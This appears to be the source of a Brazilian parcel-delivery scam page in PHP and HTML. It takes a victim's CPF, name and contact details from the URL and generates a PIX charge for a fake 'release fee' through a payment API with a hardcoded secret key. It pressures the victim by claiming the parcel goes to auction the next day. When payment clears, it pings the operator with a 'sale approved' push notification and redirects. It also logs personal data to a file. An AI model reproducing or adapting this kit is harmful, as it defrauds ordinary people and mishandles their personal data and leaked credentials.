<?php
// Enable CORS for all origins
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type, Authorization, X-Requested-With');

// Handle preflight OPTIONS request
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit();
}

// Função para registrar logs de depuração
function debugLog($message) {
    $logFile = 'debug.log';
    $timestamp = date('Y-m-d H:i:s');
    file_put_contents($logFile, "[$timestamp] $message\n", FILE_APPEND);
}

// Validação dos parâmetros
$cpf = isset($_GET['cpf']) && !empty($_GET['cpf']) ? preg_replace('/[^0-9]/', '', $_GET['cpf']) : '86825242016';
$nome = isset($_GET['nome']) && !empty($_GET['nome']) ? urldecode($_GET['nome']) : 'Omitted';
$valor = isset($_GET['valor']) && !empty($_GET['valor']) && is_numeric($_GET['valor']) ? $_GET['valor'] : '68.56';
$email = isset($_GET['email']) && !empty($_GET['email']) ? $_GET['email'] : 'pagamento@api.com';
$phone = isset($_GET['phone']) && !empty($_GET['phone']) ? $_GET['phone'] : '(41) 3348-6452';
$descricao = isset($_GET['descricao']) && !empty($_GET['descricao']) ? $_GET['descricao'] : 'Pagamento via API';

// Valida CPF (11 dígitos)
if (strlen($cpf) !== 11 || !is_numeric($cpf)) {
    debugLog("Erro: CPF inválido ($cpf)");
    http_response_code(400);
    echo json_encode(['error' => 'CPF inválido']);
    exit();
}

// Valida valor
if ((float)$valor <= 0) {
    debugLog("Erro: Valor inválido ($valor)");
    http_response_code(400);
    echo json_encode(['error' => 'Valor inválido']);
    exit();
}

// Log dos parâmetros recebidos
debugLog("Parâmetros recebidos: cpf=$cpf, nome=" . urldecode($nome) . ", valor=$valor, email=$email, phone=$phone, descricao=$descricao");

// Secret fornecido
$secret = 'Qi563T9NX8L8FI4pPmIVKemzfkDcd2JCGaA2NSJZ';

// URL da API
$url = 'https://app.rapdyn.io/api/payments';

// Payload com a estrutura da nova API
$payload = [
    'amount' => (float)$valor * 100, // Convertendo para centavos
    'method' => 'pix',
    'customer' => [
        'name' => $nome,
        'email' => $email,
        'phone' => $phone,
        'document' => [
            'type' => 'CPF',
            'value' => $cpf
        ]
    ],
    'delivery' => [
        'street' => 'Rua Manoel Pereira da Costa',
        'number' => '715',
        'neighborhood' => 'Lagoa Azul',
        'city' => 'Natal',
        'state' => 'RN',
        'zipcode' => '59138-860'
    ],
    'products' => [
        [
            'name' => $descricao,
            'price' => (float)$valor * 100, // Convertendo para centavos
            'quantity' => '1',
            'type' => 'digital'
        ]
    ]
];

// Log do início da requisição
debugLog("Iniciando requisição para API: $url");
debugLog("Payload: " . json_encode($payload));
debugLog("Headers: Content-Type: application/json, Authorization: Bearer [REDACTED]");

// Faz a requisição à API
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Content-Type: application/json',
    'Authorization: Bearer ' . $secret
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
$response = curl_exec($ch);

// Verifica erros na requisição
$pixData = [];
if (curl_errno($ch)) {
    $error = curl_error($ch);
    debugLog("Erro na requisição cURL: $error");
    $pixData = ['error' => 'Erro na requisição: ' . $error];
    http_response_code(500);
} else {
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $pixData = json_decode($response, true);
    debugLog("Resposta da API (HTTP $httpCode): " . json_encode($pixData));
}
curl_close($ch);

// Verifica se a resposta contém os dados esperados
if (!isset($pixData['pix']['copypaste']) || !isset($pixData['id']) || !isset($pixData['pix']['qrcode'])) {
    debugLog("Erro: Resposta da API não contém pix.copypaste, id ou qrcode");
    $pixData['error'] = 'Erro: Dados PIX não encontrados na resposta da API';
    http_response_code(500);
}

// Prepara dados para uso
$pixCode = isset($pixData['pix']['copypaste']) ? $pixData['pix']['copypaste'] : 'Erro: Pix não encontrado.';
$externalId = isset($pixData['id']) ? $pixData['id'] : '';
$qrCodeUrl = isset($pixData['pix']['qrcode']) ? $pixData['pix']['qrcode'] : '';
debugLog("PIX Code: $pixCode");
debugLog("External ID: $externalId");
debugLog("QR Code URL: $qrCodeUrl");
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta content="width=device-width, initial-scale=1.0" name="viewport">
    <title>Pagamento PIX</title>
    <link href="css/all.min.css" rel="stylesheet">
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @font-face {
            font-family: 'Rawline';
            src: url("/static/fonts/rawline-400.ea42a37247439622.woff2") format('woff2');
            font-weight: 400;
            font-style: normal;
        }
        @font-face {
            font-family: 'Rawline';
            src: url("/static/fonts/rawline-600.844a17f0db94d147.woff2") format('woff2');
            font-weight: 600;
            font-style: normal;
        }
        @font-face {
            font-family: 'Rawline';
            src: url("/static/fonts/rawline-700.1c7c76152b40409f.woff2") format('woff2');
            font-weight: 700;
            font-style: normal;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Rawline', sans-serif;
        }
        body {
            background-color: #f8f9fa;
            padding-top: 60px;
            color: #333333;
            font-size: 15px;
            line-height: 1.5;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 8px 20px;
            background-color: white;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            z-index: 1000;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
            height: 60px;
        }
        .logo {
            width: 140px;
            height: auto;
        }
        .header-icons {
            display: flex;
            gap: 15px;
        }
        .header-icon {
            font-size: 18px;
            color: #0056b3;
        }
        .container {
            max-width: 600px;
            margin: 7px auto;
            padding: 0 14px;
            flex: 1;
        }
        .payment-info {
            background: #e8eced;
            padding: 12px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
            margin-bottom: 13px;
            border-left: 4px solid #0071AD;
        }
        .payment-info h3 {
            color: #214885;
            font-size: 18px;
            font-weight: 600;
            margin-bottom: 1px;
        }
        .qr-container {
            text-align: center;
            margin: 10px 0;
            padding: 12px;
            background: #e8eced;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
            border-left: 4px solid #0071AD;
            margin-bottom: 13px;
        }
        .qr-container2 {
            text-align: center;
            margin: 7px 0;
            margin-bottom: -16px;
            margin-top: 0px;
            padding: 4px;
            background: #e8eced;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
            border-left: 4px solid #0071AD;
        }
        .qr-code {
            width: 150px;
            height: 150px;
            margin: 0 auto;
            background: #f8f9fa;
            padding: 3px;
            border-radius: 4px;
        }
        .pix-code {
            background: #d2d6d9;
            padding: 0px;
            border-radius: 4px;
            margin: 0px 0;
            font-family: monospace;
            word-break: break-all;
            border: 1px dashed #dee2e6;
        }
        .copy-button {
            width: 100%;
            padding: 12px;
            background-color: #0c326f;
            color: white;
            border: none;
            border-radius: 4px;
            font-weight: 600;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            margin: 14px 0;
            transition: all 0.3s ease;
        }
        .copy-button:hover {
            background-color: #092555;
            transform: translateY(-1px);
        }
        .paid-button {
            width: 100%;
            padding: 12px;
            background-color: #28a745;
            color: white;
            border: none;
            border-radius: 4px;
            font-weight: 600;
            cursor: pointer;
            display: none;
            align-items: center;
            justify-content: center;
            gap: 8px;
            margin: 14px 0;
            animation: pulse 1.5s infinite;
            transition: all 0.3s ease;
        }
        .paid-button:hover {
            background-color: #218838;
            transform: translateY(-1px);
        }
        @keyframes pulse {
            0% {
                transform: scale(1);
                box-shadow: 0 0 0 0 rgba(40, 167, 69, 0.7);
            }
            70% {
                transform: scale(1.05);
                box-shadow: 0 0 0 10px rgba(40, 167, 69, 0);
            }
            100% {
                transform: scale(1);
                box-shadow: 0 0 0 0 rgba(40, 167, 69, 0);
            }
        }
        .warning-box {
            background-color: #fdc2c2;
            border: 1px solid #f1a96a;
            color: #214885;
            padding: 8px;
            border-radius: 8px;
            margin-bottom: 13px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
            text-align: center;
        }
        .warning-box h2 {
            font-size: 20px;
            font-weight: bold;
            margin-bottom: 0px;
        }
        .warning-box p {
            font-size: 17px;
            margin-bottom: -4px;
        }
        .countdown {
            font-size: 24px;
            font-weight: bold;
            color: #f11227;
            margin-top: -6px;
            margin-bottom: -6px;
        }
        .footer {
            background-color: #FFE600;
            color: #0c326f;
            padding: 16px 0;
            text-align: center;
            margin-top: 22px;
            width: 100vw;
            position: relative;
            left: 50%;
            right: 50%;
            margin-left: -50vw;
            margin-right: -50vw;
            margin-bottom: 30px;
            box-shadow: 0 -1px 3px rgba(0,0,0,0.1);
        }
        .footer-logo {
            width: 100px;
            margin: 0 auto 8px;
            display: block;
        }
        .qr-content {
            display: flex;
            flex-direction: column;
            align-items: center;
            max-width: fit-content;
            margin: 0 auto;
        }
        .qr-content h3 {
            color: #214885;
            font-size: 1.1rem;
            margin-bottom: 5px;
            font-weight: 600;
            text-align: center;
        }
        .qr-code-wrapper {
            background: white;
            padding: 3px;
            border-radius: 9px;
            border: 3px solid #f0f0f0;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.05);
        }
        .qr-code-wrapper .qr-code img {
            display: block;
            margin: 0 auto;
            max-width: 100%;
        }
        .qr-container p {
            color: #333;
            font-weight: 400;
            font-size: 15px;
        }
        .copy-icon {
            color: #0c326f;
            font-size: 18px;
        }
        .label-azul {
            color: #0071AD;
            font-size: 15px;
        }
        .error-message {
            background-color: #f8d7da;
            color: #721c24;
            padding: 10px;
            border-radius: 4px;
            margin-bottom: 13px;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="header">
        <img alt="" class="logo" src="https://encomendagarantida.com/rastreio/encomenda/images/1.png">
        <div class="header-icons">
            <i class="fas fa-search header-icon"></i>
            <i class="fas fa-question-circle header-icon"></i>
            <i class="fas fa-adjust header-icon"></i>
        </div>
    </div>

    <div class="container">
        <?php if (isset($pixData['error'])): ?>
            <div class="error-message">
                <p><strong>Erro:</strong> <?php echo htmlspecialchars($pixData['error']); ?></p>
            </div>
        <?php else: ?>
            <div class="warning-box">
                <h2>ATENÇÃO: <span id="nomeCliente"><?php echo htmlspecialchars($nome); ?></span></h2>
                <p></p>
                <p></p>
                <p>Caso o pagamento não seja efetuado agora,</p>
                <p>sua encomenda irá para o leilão amanhã!</p>
                <p><strong>
                    <?php
                    $amanha = strtotime('+1 day');
                    $meses = ['Janeiro', 'Fevereiro', 'Março', 'Abril', 'Maio', 'Junho', 'Julho', 'Agosto', 'Setembro', 'Outubro', 'Novembro', 'Dezembro'];
                    echo date('d', $amanha) . ' de ' . $meses[date('n', $amanha) - 1] . ' de ' . date('Y', $amanha);
                    ?>
                </strong></p>
                <p><strong>Efetue o pagamento imediatamente para evitar o abandono da sua encomenda.</strong></p>
            </div>
            
            <div class="payment-info">
                <h3>Detalhes do Pagamento</h3>
                <p><strong class="label-azul">Taxa de Liberação</strong></p>
                <p><strong>CPF:</strong> <span id="cpfCliente"><?php echo htmlspecialchars(preg_replace('/(\d{3})(\d{3})(\d{3})(\d{2})/', '$1.$2.$3-$4', $cpf)); ?></span></p>
                <p><strong>Valor:</strong> R$ <span id="valorPix"><?php echo htmlspecialchars($valor); ?></span></p>
            </div>

            <div class="qr-container">
                <p style="margin-bottom: 10px; font-weight: 600;">Copie o código PIX</p>
                <div style="background-color: #ecf4ff; margin-bottom: 13px; padding: 10px 16px; border: 1.8px solid #b3cff3; border-radius: 8px; box-shadow: 0 2px 6px rgba(0,0,0,0.08); overflow-x: auto;">
                    <div style="display: flex; align-items: center; justify-content: space-between; gap: 10px;">
                        <div id="pixCode" style="flex: 1; font-family: monospace; font-size: 16px; color: #333; white-space: nowrap; overflow-x: auto;">
                            <?php echo htmlspecialchars($pixCode); ?>
                        </div>
                        <button onclick="copyPixCode()" style="background: none; border: none; cursor: pointer;">
                            <i class="fas fa-copy" style="color: #0071AD; font-size: 18px;"></i>
                        </button>
                    </div>
                </div>

                <button onclick="copyPixCode()" class="copy-button" style="margin-top: 10px; background-color: #0a66b5;">
                    <i class="fas fa-copy"></i> Copiar código do QR Code
                </button>
                <button onclick="window.location.href='https://chat.equipeatendimento2.it.com/up'" class="paid-button" id="paidButton">
                    <i class="fas fa-check"></i> Já Paguei
                </button>
                <p>1. Abra o ambiente do Pix do seu banco ou instituição financeira.</p>
                <p>2. Copie o código em "Copiar código do QR Code" e selecione no seu app a opção "Pix Copia e Cola"</p>
            </div>     
            <div class="qr-container2">
                <div class="qr-content">
                    <h3>Escaneie o QR Code PIX</h3>
                    <div class="qr-code-wrapper">
                        <div class="qr-code">
                            <?php if ($qrCodeUrl): ?>
                                <img src="<?php echo htmlspecialchars($qrCodeUrl); ?>" alt="QR Code PIX" style="width: 150px; height: 150px;">
                            <?php else: ?>
                                <p>Erro: Não foi possível gerar o QR Code.</p>
                            <?php endif; ?>
                        </div>
                    </div>
                    <p>1. Abra o ambiente do Pix do seu banco ou instituição financeira.</p>
                    <p>2. Escolha a opção "Pagar com QR Code" e escaneie o código.</p>
                </div>
            </div>
            <div id="paymentStatus" style="display: none;"></div>
        <?php endif; ?>
    </div>

    <footer class="footer">
        <img src="https://encomendagarantida.com/rastreio/encomenda/images/1.png" alt="" class="footer-logo">
        <p>© 2025 do Brasil. Todos Sexo: masculino. Todos os direitos reservados.</p>
    </footer>

    <script>
        let notificationSent = false;
        let checkCount = 0;
        const maxChecks = 200;

        function verificarStatusPagamento() {
            const pixData = <?php echo json_encode($pixData); ?>;
            const transactionId = "<?php echo htmlspecialchars($externalId); ?>";

            if (!transactionId) {
                console.error("❌ transactionId não encontrado");
                return;
            }

            fetch(`https://app.rapdyn.io/api/payment-status/${transactionId}`, {
                headers: {
                    'Authorization': 'Bearer banana'
                }
            })
                .then(response => {
                    if (!response.ok) throw new Error(`Erro HTTP: ${response.status}`);
                    return response.json();
                })
                .then(data => {
                    checkCount++;
                    console.log(`🔄 Tentativa ${checkCount}:`, data);

                    if (data.status === 'PAID') {
                        console.log("✅ Pagamento confirmado!");
                        
                        sessionStorage.removeItem("pix_data1");
                        sessionStorage.removeItem("pixData");
                        sessionStorage.removeItem("externalId");
                        sessionStorage.removeItem("pixCode");
                        sessionStorage.removeItem("status");
                        
                        if (!notificationSent) {
                            fetch("https://api.pushcut.io/wciBAFXDTHO-VzCOtbMzP/notifications/RCFRONT", {
                                method: "POST",
                                headers: { "Content-Type": "application/json" },
                                body: JSON.stringify({
                                    title: "Venda Aprovada!",
                                    message: "Seu pagamento via Pix foi processado com sucesso."
                                })
                            }).then(() => {
                                console.log("📲 Notificação enviada com sucesso.");
                                notificationSent = true;
                            }).catch(err => console.error("❌ Erro ao enviar notificação:", err));
                        }

                        setTimeout(() => {
                            const urlParams = new URLSearchParams(window.location.search);
                            const cpf = urlParams.get('cpf');
                            const nome = urlParams.get('nome');

                            if (cpf && nome) {
                                window.location.href = `https://seusobjetos.site/obg/?cpf=${encodeURIComponent(cpf)}&nome=${encodeURIComponent(nome)}`;
                            } else {
                                console.error("⚠️ CPF ou nome ausentes na URL");
                            }
                        }, 2000);
                    } else {
                        if (checkCount < maxChecks) {
                            setTimeout(verificarStatusPagamento, 3000);
                        } else {
                            console.warn("⏳ Limite de verificações atingido. Encerrando.");
                        }
                    }
                })
                .catch(error => {
                    console.error("❌ Erro ao verificar status:", error);
                    if (checkCount < maxChecks) {
                        setTimeout(verificarStatusPagamento, 3000);
                    }
                });
        }

        function formatarCPF(cpf) {
            cpf = cpf.replace(/\D/g, '');
            return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
        }

        function copyPixCode() {
            const pixCode = document.getElementById('pixCode').textContent.trim();
            const copyButton = document.querySelector('.copy-button');
            navigator.clipboard.writeText(pixCode).then(
                function() {
                    copyButton.innerHTML = '<i class="fas fa-check"></i> Código Copiado';
                    copyButton.style.backgroundColor = '#28a745';
                    setTimeout(() => {
                        copyButton.innerHTML = '<i class="fas fa-copy"></i> Copiar código PIX';
                        copyButton.style.backgroundColor = '#0c326f';
                    }, 2000);
                },
                function(err) {
                    console.error('Erro ao copiar:', err);
                    copyButton.innerHTML = '<i class="fas fa-times"></i> Erro ao copiar';
                    copyButton.style.backgroundColor = '#dc3545';
                }
            );
        }

        document.addEventListener("DOMContentLoaded", function () {
            const pixData = <?php echo json_encode($pixData); ?>;
            sessionStorage.setItem("pix_data1", JSON.stringify(pixData));

            if (pixData.error || !pixData.pix?.copypaste || !pixData.id) {
                document.getElementById("pixCode").innerText = pixData.error || "Erro: Pix não encontrado.";
                return;
            }

            document.getElementById("pixCode").innerText = pixData.pix.copypaste;
            document.getElementById("nomeCliente").innerText = decodeURIComponent("<?php echo rawurlencode($nome); ?>");
            document.getElementById("cpfCliente").innerText = formatarCPF("<?php echo htmlspecialchars($cpf); ?>");

            // Mostrar o botão "Já Paguei" após 1 minuto
            setTimeout(() => {
                document.getElementById("paidButton").style.display = 'flex';
            }, 60000);

            verificarStatusPagamento();
        });
    </script>
</body>
</html>